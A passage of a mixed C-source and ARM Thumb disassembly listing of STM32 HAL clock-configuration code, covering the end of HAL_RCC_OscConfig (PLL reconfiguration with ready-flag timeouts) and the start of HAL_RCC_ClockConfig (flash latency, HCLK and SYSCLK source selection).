 8003f12:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 8003f16:	687b      	ldr	r3, [r7, #4]
 8003f18:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8003f1a:	085b      	lsrs	r3, r3, #1
 8003f1c:	3b01      	subs	r3, #1
 8003f1e:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003f20:	429a      	cmp	r2, r3
 8003f22:	d109      	bne.n	8003f38 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 8003f24:	697b      	ldr	r3, [r7, #20]
 8003f26:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 8003f2a:	687b      	ldr	r3, [r7, #4]
 8003f2c:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8003f2e:	085b      	lsrs	r3, r3, #1
 8003f30:	3b01      	subs	r3, #1
 8003f32:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003f34:	429a      	cmp	r2, r3
 8003f36:	d06b      	beq.n	8004010 <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8003f38:	69bb      	ldr	r3, [r7, #24]
 8003f3a:	2b0c      	cmp	r3, #12
 8003f3c:	d062      	beq.n	8004004 <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 8003f3e:	4b32      	ldr	r3, [pc, #200]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003f40:	681b      	ldr	r3, [r3, #0]
 8003f42:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 8003f46:	2b00      	cmp	r3, #0
 8003f48:	d001      	beq.n	8003f4e <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 8003f4a:	2301      	movs	r3, #1
 8003f4c:	e0ac      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 8003f4e:	4b2e      	ldr	r3, [pc, #184]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003f50:	681b      	ldr	r3, [r3, #0]
 8003f52:	4a2d      	ldr	r2, [pc, #180]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003f54:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8003f58:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003f5a:	f7fd f915 	bl	8001188 <HAL_GetTick>
 8003f5e:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003f60:	e008      	b.n	8003f74 <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003f62:	f7fd f911 	bl	8001188 <HAL_GetTick>
 8003f66:	4602      	mov	r2, r0
 8003f68:	693b      	ldr	r3, [r7, #16]
 8003f6a:	1ad3      	subs	r3, r2, r3
 8003f6c:	2b02      	cmp	r3, #2
 8003f6e:	d901      	bls.n	8003f74 <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 8003f70:	2303      	movs	r3, #3
 8003f72:	e099      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003f74:	4b24      	ldr	r3, [pc, #144]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003f76:	681b      	ldr	r3, [r3, #0]
 8003f78:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003f7c:	2b00      	cmp	r3, #0
 8003f7e:	d1f0      	bne.n	8003f62 <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 8003f80:	4b21      	ldr	r3, [pc, #132]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003f82:	68da      	ldr	r2, [r3, #12]
 8003f84:	4b21      	ldr	r3, [pc, #132]	; (800400c <HAL_RCC_OscConfig+0x77c>)
 8003f86:	4013      	ands	r3, r2
 8003f88:	687a      	ldr	r2, [r7, #4]
 8003f8a:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 8003f8c:	687a      	ldr	r2, [r7, #4]
 8003f8e:	6b12      	ldr	r2, [r2, #48]	; 0x30
 8003f90:	3a01      	subs	r2, #1
 8003f92:	0112      	lsls	r2, r2, #4
 8003f94:	4311      	orrs	r1, r2
 8003f96:	687a      	ldr	r2, [r7, #4]
 8003f98:	6b52      	ldr	r2, [r2, #52]	; 0x34
 8003f9a:	0212      	lsls	r2, r2, #8
 8003f9c:	4311      	orrs	r1, r2
 8003f9e:	687a      	ldr	r2, [r7, #4]
 8003fa0:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 8003fa2:	0852      	lsrs	r2, r2, #1
 8003fa4:	3a01      	subs	r2, #1
 8003fa6:	0552      	lsls	r2, r2, #21
 8003fa8:	4311      	orrs	r1, r2
 8003faa:	687a      	ldr	r2, [r7, #4]
 8003fac:	6c12      	ldr	r2, [r2, #64]	; 0x40
 8003fae:	0852      	lsrs	r2, r2, #1
 8003fb0:	3a01      	subs	r2, #1
 8003fb2:	0652      	lsls	r2, r2, #25
 8003fb4:	4311      	orrs	r1, r2
 8003fb6:	687a      	ldr	r2, [r7, #4]
 8003fb8:	6b92      	ldr	r2, [r2, #56]	; 0x38
 8003fba:	06d2      	lsls	r2, r2, #27
 8003fbc:	430a      	orrs	r2, r1
 8003fbe:	4912      	ldr	r1, [pc, #72]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003fc0:	4313      	orrs	r3, r2
 8003fc2:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 8003fc4:	4b10      	ldr	r3, [pc, #64]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003fc6:	681b      	ldr	r3, [r3, #0]
 8003fc8:	4a0f      	ldr	r2, [pc, #60]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003fca:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003fce:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8003fd0:	4b0d      	ldr	r3, [pc, #52]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003fd2:	68db      	ldr	r3, [r3, #12]
 8003fd4:	4a0c      	ldr	r2, [pc, #48]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003fd6:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003fda:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003fdc:	f7fd f8d4 	bl	8001188 <HAL_GetTick>
 8003fe0:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8003fe2:	e008      	b.n	8003ff6 <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003fe4:	f7fd f8d0 	bl	8001188 <HAL_GetTick>
 8003fe8:	4602      	mov	r2, r0
 8003fea:	693b      	ldr	r3, [r7, #16]
 8003fec:	1ad3      	subs	r3, r2, r3
 8003fee:	2b02      	cmp	r3, #2
 8003ff0:	d901      	bls.n	8003ff6 <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 8003ff2:	2303      	movs	r3, #3
 8003ff4:	e058      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8003ff6:	4b04      	ldr	r3, [pc, #16]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003ff8:	681b      	ldr	r3, [r3, #0]
 8003ffa:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003ffe:	2b00      	cmp	r3, #0
 8004000:	d0f0      	beq.n	8003fe4 <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8004002:	e050      	b.n	80040a6 <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 8004004:	2301      	movs	r3, #1
 8004006:	e04f      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
 8004008:	40021000 	.word	0x40021000
 800400c:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004010:	4b27      	ldr	r3, [pc, #156]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 8004012:	681b      	ldr	r3, [r3, #0]
 8004014:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004018:	2b00      	cmp	r3, #0
 800401a:	d144      	bne.n	80040a6 <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 800401c:	4b24      	ldr	r3, [pc, #144]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 800401e:	681b      	ldr	r3, [r3, #0]
 8004020:	4a23      	ldr	r2, [pc, #140]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 8004022:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8004026:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8004028:	4b21      	ldr	r3, [pc, #132]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 800402a:	68db      	ldr	r3, [r3, #12]
 800402c:	4a20      	ldr	r2, [pc, #128]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 800402e:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8004032:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 8004034:	f7fd f8a8 	bl	8001188 <HAL_GetTick>
 8004038:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800403a:	e008      	b.n	800404e <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 800403c:	f7fd f8a4 	bl	8001188 <HAL_GetTick>
 8004040:	4602      	mov	r2, r0
 8004042:	693b      	ldr	r3, [r7, #16]
 8004044:	1ad3      	subs	r3, r2, r3
 8004046:	2b02      	cmp	r3, #2
 8004048:	d901      	bls.n	800404e <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 800404a:	2303      	movs	r3, #3
 800404c:	e02c      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800404e:	4b18      	ldr	r3, [pc, #96]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 8004050:	681b      	ldr	r3, [r3, #0]
 8004052:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004056:	2b00      	cmp	r3, #0
 8004058:	d0f0      	beq.n	800403c <HAL_RCC_OscConfig+0x7ac>
 800405a:	e024      	b.n	80040a6 <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 800405c:	69bb      	ldr	r3, [r7, #24]
 800405e:	2b0c      	cmp	r3, #12
 8004060:	d01f      	beq.n	80040a2 <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 8004062:	4b13      	ldr	r3, [pc, #76]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 8004064:	681b      	ldr	r3, [r3, #0]
 8004066:	4a12      	ldr	r2, [pc, #72]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 8004068:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 800406c:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 800406e:	f7fd f88b 	bl	8001188 <HAL_GetTick>
 8004072:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004074:	e008      	b.n	8004088 <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004076:	f7fd f887 	bl	8001188 <HAL_GetTick>
 800407a:	4602      	mov	r2, r0
 800407c:	693b      	ldr	r3, [r7, #16]
 800407e:	1ad3      	subs	r3, r2, r3
 8004080:	2b02      	cmp	r3, #2
 8004082:	d901      	bls.n	8004088 <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 8004084:	2303      	movs	r3, #3
 8004086:	e00f      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004088:	4b09      	ldr	r3, [pc, #36]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 800408a:	681b      	ldr	r3, [r3, #0]
 800408c:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004090:	2b00      	cmp	r3, #0
 8004092:	d1f0      	bne.n	8004076 <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 8004094:	4b06      	ldr	r3, [pc, #24]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 8004096:	68da      	ldr	r2, [r3, #12]
 8004098:	4905      	ldr	r1, [pc, #20]	; (80040b0 <HAL_RCC_OscConfig+0x820>)
 800409a:	4b06      	ldr	r3, [pc, #24]	; (80040b4 <HAL_RCC_OscConfig+0x824>)
 800409c:	4013      	ands	r3, r2
 800409e:	60cb      	str	r3, [r1, #12]
 80040a0:	e001      	b.n	80040a6 <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 80040a2:	2301      	movs	r3, #1
 80040a4:	e000      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 80040a6:	2300      	movs	r3, #0
}
 80040a8:	4618      	mov	r0, r3
 80040aa:	3720      	adds	r7, #32
 80040ac:	46bd      	mov	sp, r7
 80040ae:	bd80      	pop	{r7, pc}
 80040b0:	40021000 	.word	0x40021000
 80040b4:	feeefffc 	.word	0xfeeefffc

080040b8 <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 80040b8:	b580      	push	{r7, lr}
 80040ba:	b084      	sub	sp, #16
 80040bc:	af00      	add	r7, sp, #0
 80040be:	6078      	str	r0, [r7, #4]
 80040c0:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 80040c2:	687b      	ldr	r3, [r7, #4]
 80040c4:	2b00      	cmp	r3, #0
 80040c6:	d101      	bne.n	80040cc <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 80040c8:	2301      	movs	r3, #1
 80040ca:	e0e7      	b.n	800429c <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 80040cc:	4b75      	ldr	r3, [pc, #468]	; (80042a4 <HAL_RCC_ClockConfig+0x1ec>)
 80040ce:	681b      	ldr	r3, [r3, #0]
 80040d0:	f003 0307 	and.w	r3, r3, #7
 80040d4:	683a      	ldr	r2, [r7, #0]
 80040d6:	429a      	cmp	r2, r3
 80040d8:	d910      	bls.n	80040fc <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 80040da:	4b72      	ldr	r3, [pc, #456]	; (80042a4 <HAL_RCC_ClockConfig+0x1ec>)
 80040dc:	681b      	ldr	r3, [r3, #0]
 80040de:	f023 0207 	bic.w	r2, r3, #7
 80040e2:	4970      	ldr	r1, [pc, #448]	; (80042a4 <HAL_RCC_ClockConfig+0x1ec>)
 80040e4:	683b      	ldr	r3, [r7, #0]
 80040e6:	4313      	orrs	r3, r2
 80040e8:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 80040ea:	4b6e      	ldr	r3, [pc, #440]	; (80042a4 <HAL_RCC_ClockConfig+0x1ec>)
 80040ec:	681b      	ldr	r3, [r3, #0]
 80040ee:	f003 0307 	and.w	r3, r3, #7
 80040f2:	683a      	ldr	r2, [r7, #0]
 80040f4:	429a      	cmp	r2, r3
 80040f6:	d001      	beq.n	80040fc <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 80040f8:	2301      	movs	r3, #1
 80040fa:	e0cf      	b.n	800429c <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80040fc:	687b      	ldr	r3, [r7, #4]
 80040fe:	681b      	ldr	r3, [r3, #0]
 8004100:	f003 0302 	and.w	r3, r3, #2
 8004104:	2b00      	cmp	r3, #0
 8004106:	d010      	beq.n	800412a <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 8004108:	687b      	ldr	r3, [r7, #4]
 800410a:	689a      	ldr	r2, [r3, #8]
 800410c:	4b66      	ldr	r3, [pc, #408]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 800410e:	689b      	ldr	r3, [r3, #8]
 8004110:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004114:	429a      	cmp	r2, r3
 8004116:	d908      	bls.n	800412a <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8004118:	4b63      	ldr	r3, [pc, #396]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 800411a:	689b      	ldr	r3, [r3, #8]
 800411c:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004120:	687b      	ldr	r3, [r7, #4]
 8004122:	689b      	ldr	r3, [r3, #8]
 8004124:	4960      	ldr	r1, [pc, #384]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 8004126:	4313      	orrs	r3, r2
 8004128:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 800412a:	687b      	ldr	r3, [r7, #4]
 800412c:	681b      	ldr	r3, [r3, #0]
 800412e:	f003 0301 	and.w	r3, r3, #1
 8004132:	2b00      	cmp	r3, #0
 8004134:	d04c      	beq.n	80041d0 <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 8004136:	687b      	ldr	r3, [r7, #4]
 8004138:	685b      	ldr	r3, [r3, #4]
 800413a:	2b03      	cmp	r3, #3
 800413c:	d107      	bne.n	800414e <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800413e:	4b5a      	ldr	r3, [pc, #360]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 8004140:	681b      	ldr	r3, [r3, #0]
 8004142:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004146:	2b00      	cmp	r3, #0
 8004148:	d121      	bne.n	800418e <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 800414a:	2301      	movs	r3, #1
 800414c:	e0a6      	b.n	800429c <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 800414e:	687b      	ldr	r3, [r7, #4]
 8004150:	685b      	ldr	r3, [r3, #4]
 8004152:	2b02      	cmp	r3, #2
 8004154:	d107      	bne.n	8004166 <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8004156:	4b54      	ldr	r3, [pc, #336]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 8004158:	681b      	ldr	r3, [r3, #0]
 800415a:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800415e:	2b00      	cmp	r3, #0
 8004160:	d115      	bne.n	800418e <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 8004162:	2301      	movs	r3, #1
 8004164:	e09a      	b.n	800429c <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 8004166:	687b      	ldr	r3, [r7, #4]
 8004168:	685b      	ldr	r3, [r3, #4]
 800416a:	2b00      	cmp	r3, #0
 800416c:	d107      	bne.n	800417e <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 800416e:	4b4e      	ldr	r3, [pc, #312]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 8004170:	681b      	ldr	r3, [r3, #0]
 8004172:	f003 0302 	and.w	r3, r3, #2
 8004176:	2b00      	cmp	r3, #0
 8004178:	d109      	bne.n	800418e <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800417a:	2301      	movs	r3, #1
 800417c:	e08e      	b.n	800429c <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 800417e:	4b4a      	ldr	r3, [pc, #296]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 8004180:	681b      	ldr	r3, [r3, #0]
 8004182:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004186:	2b00      	cmp	r3, #0
 8004188:	d101      	bne.n	800418e <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800418a:	2301      	movs	r3, #1
 800418c:	e086      	b.n	800429c <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 800418e:	4b46      	ldr	r3, [pc, #280]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 8004190:	689b      	ldr	r3, [r3, #8]
 8004192:	f023 0203 	bic.w	r2, r3, #3
 8004196:	687b      	ldr	r3, [r7, #4]
 8004198:	685b      	ldr	r3, [r3, #4]
 800419a:	4943      	ldr	r1, [pc, #268]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 800419c:	4313      	orrs	r3, r2
 800419e:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 80041a0:	f7fc fff2 	bl	8001188 <HAL_GetTick>
 80041a4:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 80041a6:	e00a      	b.n	80041be <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 80041a8:	f7fc ffee 	bl	8001188 <HAL_GetTick>
 80041ac:	4602      	mov	r2, r0
 80041ae:	68fb      	ldr	r3, [r7, #12]
 80041b0:	1ad3      	subs	r3, r2, r3
 80041b2:	f241 3288 	movw	r2, #5000	; 0x1388
 80041b6:	4293      	cmp	r3, r2
 80041b8:	d901      	bls.n	80041be <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 80041ba:	2303      	movs	r3, #3
 80041bc:	e06e      	b.n	800429c <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 80041be:	4b3a      	ldr	r3, [pc, #232]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 80041c0:	689b      	ldr	r3, [r3, #8]
 80041c2:	f003 020c 	and.w	r2, r3, #12
 80041c6:	687b      	ldr	r3, [r7, #4]
 80041c8:	685b      	ldr	r3, [r3, #4]
 80041ca:	009b      	lsls	r3, r3, #2
 80041cc:	429a      	cmp	r2, r3
 80041ce:	d1eb      	bne.n	80041a8 <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80041d0:	687b      	ldr	r3, [r7, #4]
 80041d2:	681b      	ldr	r3, [r3, #0]
 80041d4:	f003 0302 	and.w	r3, r3, #2
 80041d8:	2b00      	cmp	r3, #0
 80041da:	d010      	beq.n	80041fe <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 80041dc:	687b      	ldr	r3, [r7, #4]
 80041de:	689a      	ldr	r2, [r3, #8]
 80041e0:	4b31      	ldr	r3, [pc, #196]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 80041e2:	689b      	ldr	r3, [r3, #8]
 80041e4:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 80041e8:	429a      	cmp	r2, r3
 80041ea:	d208      	bcs.n	80041fe <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 80041ec:	4b2e      	ldr	r3, [pc, #184]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 80041ee:	689b      	ldr	r3, [r3, #8]
 80041f0:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80041f4:	687b      	ldr	r3, [r7, #4]
 80041f6:	689b      	ldr	r3, [r3, #8]
 80041f8:	492b      	ldr	r1, [pc, #172]	; (80042a8 <HAL_RCC_ClockConfig+0x1f0>)
 80041fa:	4313      	orrs	r3, r2
 80041fc:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 80041fe:	4b29      	ldr	r3, [pc, #164]	; (80042a4 <HAL_RCC_ClockConfig+0x1ec>)
 8004200:	681b      	ldr	r3, [r3, #0]
 8004202:	f003 0307 	and.w	r3, r3, #7
